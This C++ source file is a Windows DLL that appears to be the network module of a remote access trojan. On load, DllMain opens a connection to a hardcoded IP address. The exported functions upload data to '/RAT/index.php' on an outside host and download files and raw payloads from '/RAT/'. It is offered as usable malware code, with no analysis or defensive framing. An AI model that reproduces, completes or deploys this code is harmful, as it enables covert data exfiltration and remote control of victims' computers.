#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <mutex>
#include <vector>

SOCKET clientSocket = INVALID_SOCKET;
std::mutex socketMutex;

int safe_closesocket()
{
    std::lock_guard<std::mutex> lock(socketMutex);
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        return 0;
    }
    return 1;
}

int socket_setup()
{
    std::lock_guard<std::mutex> lock(socketMutex);
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 0;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 0;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    while (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        if (error != WSAECONNREFUSED)
            std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
        else
            std::cerr << "Connection refused. Retrying in 2 seconds...\n";
        Sleep(2000);
    }
    return 1;
}

__declspec(dllexport) int send_data(const std::string& filename, const std::string& data)
{
    std::lock_guard<std::mutex> lock(socketMutex);

    std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n"
                                "Host: arth.imbeddex.com\r\n"
                                "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n"
                                "Content-Type: application/octet-stream\r\n"
                                "Connection: keep-alive\r\n\r\n" +
                                filename + data;
    int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cerr << "Send failed with error: " << error << std::endl;
        return 1;
    }
    return 0;
}

__declspec(dllexport) std::string receive_data(const std::string& filename)
{
    std::lock_guard<std::mutex> lock(socketMutex);

    std::string requestString = "GET /RAT/" + filename + " HTTP/1.1\r\n"
                                "Host: arth.imbeddex.com\r\n"
                                "Connection: keep-alive\r\n\r\n";
    int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cerr << "Send failed with error: " << error << std::endl;
        return "";
    }

    char buffer[4096];
    std::string receivedData;
    int bytesReceived;

    do {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0)
        {
            buffer[bytesReceived] = '\0';
            receivedData += buffer;
        }
        else if (bytesReceived == 0)
        {
            //std::cerr << "Connection closed by server." << std::endl;
            break;
        }
        else
        {
            int error = WSAGetLastError();
            if (error != WSAECONNRESET)
                std::cerr << "Receive failed with error: " << error << std::endl;
            break;
        }
    } while (bytesReceived == sizeof(buffer) - 1);

    size_t headerEnd = receivedData.find("\r\n\r\n");
    if (headerEnd == std::string::npos)
    {
        std::cerr << "Invalid HTTP response: No header/body separator found." << std::endl;
        return "";
    }

    std::string body = receivedData.substr(headerEnd + 4);

    size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
    if (transferEncodingPos != std::string::npos)
    {
        std::string unchunkedBody;
        const char* ptr = body.c_str();
        const char* end = ptr + body.length();

        while (ptr < end)
        {
            while (ptr < end && (*ptr == ' ' || *ptr == '\r' || *ptr == '\n'))
                ptr++;

            if (ptr >= end) break;

            size_t chunkSize = 0;
            while (ptr < end && isxdigit(*ptr))
            {
                chunkSize *= 16;
                chunkSize += isdigit(*ptr) ? *ptr - '0' : (tolower(*ptr) - 'a' + 10);
                ptr++;
            }

            while (ptr < end && (*ptr == '\r' || *ptr == '\n')) ptr++;

            if (chunkSize == 0) break;
            if (ptr + chunkSize > end) break;

            unchunkedBody.append(ptr, chunkSize);
            ptr += chunkSize;
        }
        body = unchunkedBody;
    }

    return body;
}

__declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::string &filename)
{
    std::lock_guard<std::mutex> lock(socketMutex);


    // Send HTTP GET request
    std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: keep-alive\r\n\r\n";

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cerr << "Send failed with error: " << error << std::endl;
        throw std::runtime_error("Send failed");
    }

    // Receive data in chunks
    char buffer[8192]; // Increased buffer size
    std::vector<unsigned char> receivedData;
    int bytesReceived;

    while (true) {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
        } else if (bytesReceived == 0) {
            //std::cerr << "Connection closed by server." << std::endl;
            break;
        } else {
            int error = WSAGetLastError();
            std::cerr << "Receive failed with error: " << error << std::endl;
            break;
        }
    }

    // Ensure header separator is found
    size_t headerEnd = 0;
    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

    // Search for header separator (CRLF + CRLF)
    for (size_t i = 0; i < receivedData.size() - 3; ++i)
    {
        if (receivedData[i] == CRLF[0] && receivedData[i + 1] == CRLF[1] && receivedData[i + 2] == CRLF[2] && receivedData[i + 3] == CRLF[3])
        {
            headerEnd = i + 4; // Found header, skip the separator
            break;
        }
    }

    if (headerEnd != 0) 
    {
        //cout << "Header found at position: " << headerEnd << std::endl;
    }
    else
    {
        std::cerr << "Header separator not found." << std::endl;
        receivedData.clear();
        return std::vector<unsigned char>();
    }

    // Make sure headerEnd + 4 is within the bounds of the receivedData
    if (headerEnd <= receivedData.size())
    {
        // Extract body after header (start from headerEnd)
        std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());

        return body; // Return the extracted body
    }
    else {
        std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
        receivedData.clear();
        return std::vector<unsigned char>();
    }
    
    return std::vector<unsigned char>();
}

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            socket_setup();
            break;
        case DLL_PROCESS_DETACH:
            safe_closesocket();
            WSACleanup();
            break;
        case DLL_THREAD_ATTACH:
            socket_setup();
            break;
        case DLL_THREAD_DETACH:
            safe_closesocket();
            WSACleanup();
            break;
    }
    return TRUE;
}
